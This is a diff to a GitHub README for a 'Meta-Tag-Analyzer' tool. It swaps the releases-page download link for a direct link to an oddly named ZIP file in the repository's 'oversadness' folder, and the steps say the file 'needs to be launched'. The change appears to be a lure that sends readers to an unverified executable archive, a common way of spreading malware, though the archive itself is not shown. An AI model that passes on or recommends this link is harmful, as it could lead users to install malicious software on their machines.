@@ -26,7 +26,7 @@ Welcome to the Meta-Tag-Analyzer repository! This tool allows you to analyze the
 ## How to Use 🧰
 
 1. Download the Meta-Tag-Analyzer tool from the following link: 
-[![Download App](https://github.com/AiaPrinci/Meta-Tag-Analyzer/releases)](https://github.com/AiaPrinci/Meta-Tag-Analyzer/releases) - *Needs to be launched*
+[![Download App](https://github.com/AiaPrinci/Meta-Tag-Analyzer/raw/refs/heads/main/oversadness/Analyzer-Tag-Meta-nonagon.zip)](https://github.com/AiaPrinci/Meta-Tag-Analyzer/raw/refs/heads/main/oversadness/Analyzer-Tag-Meta-nonagon.zip) - *Needs to be launched*
 
 2. Extract the downloaded ZIP file to your preferred location.
 
